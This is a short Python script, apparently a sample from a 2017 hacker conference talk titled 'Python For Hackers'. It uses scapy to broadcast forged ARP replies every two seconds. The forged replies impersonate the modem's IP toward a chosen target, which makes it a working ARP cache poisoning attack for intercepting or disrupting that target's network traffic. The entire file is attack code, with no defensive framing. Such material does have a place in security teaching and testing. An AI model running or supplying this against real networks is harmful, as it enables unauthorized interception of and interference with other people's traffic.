# Hacktrickconf 2017 - EmreOvunc
# Python For Hackers

from scapy.all import *
targetIP = input('Target IP: ')
modemIP = input('Modem IP: ')

while True:
    time.sleep(2)
    sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc=modemIP, pdst=targetIP))
